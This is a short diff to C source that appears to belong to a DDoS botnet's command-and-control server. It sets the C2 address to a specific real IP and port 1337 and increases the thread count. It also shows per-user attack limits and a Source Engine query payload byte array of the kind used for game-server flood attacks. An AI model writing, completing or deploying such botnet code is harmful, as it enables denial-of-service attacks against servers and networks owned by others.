@@ -12,12 +12,12 @@
 #include <signal.h>
 
 // Configuration
-#define C2_ADDRESS "your ip vps"
+#define C2_ADDRESS "5.249.164.83"
 #define C2_PORT 1337
 #define MAX_USERS 50
 #define MAX_ATTACKS_PER_USER 10
 #define BUFFER_SIZE 2048
-#define MAX_THREADS 1000
+#define MAX_THREADS 1400
 
 // Payloads
 unsigned char payload_vse[] = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
